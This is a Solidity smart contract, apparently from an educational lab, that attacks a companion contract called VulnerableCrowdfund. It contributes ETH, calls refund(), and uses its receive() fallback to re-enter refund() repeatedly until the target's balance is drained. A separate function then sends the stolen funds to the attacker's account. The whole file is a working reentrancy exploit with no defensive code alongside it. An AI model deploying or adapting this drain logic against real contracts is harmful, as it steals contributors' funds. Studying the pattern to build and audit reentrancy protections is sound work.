// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./VulnerableCrowdfund.sol";

/// @title ReentrancyAttacker
/// @notice Malicious contract that exploits the reentrancy bug in
/// VulnerableCrowdfund.refund(). Used for educational purposes.
contract ReentrancyAttacker {
    VulnerableCrowdfund public target;
    address public owner;
    uint256 public drainCount;

    constructor(address _target) {
        target = VulnerableCrowdfund(_target);
        owner = msg.sender;
    }

    /// @notice Start the reentrancy attack by contributing and immediately
    /// requesting a refund. The fallback will re-enter until funds are drained.
    function attack() external payable {
        require(msg.value > 0, "send ETH to attack");

        // Step 1: Contribute to the vulnerable contract to populate
        // contributions mapping with msg.value.
        target.contribute{value: msg.value}();

        // Step 2: Trigger the vulnerable refund function once.
        target.refund();
    }

    /// @dev Re-enters the vulnerable refund() as long as there is balance to steal.
    receive() external payable {
        // Only keep attacking while the contract still holds funds and the
        // contributions mapping for this contract is nonzero.
        uint256 targetBalance = address(target).balance;
        uint256 owed = target.contributions(address(this));

        if (targetBalance >= owed && owed > 0) {
            drainCount += 1;
            target.refund();
        }
    }

    /// @notice Withdraw stolen funds to the attacker-controlled EOA.
    function withdrawStolenFunds() external {
        require(msg.sender == owner, "not owner");
        (bool ok, ) = owner.call{value: address(this).balance}("");
        require(ok, "withdraw failed");
    }
}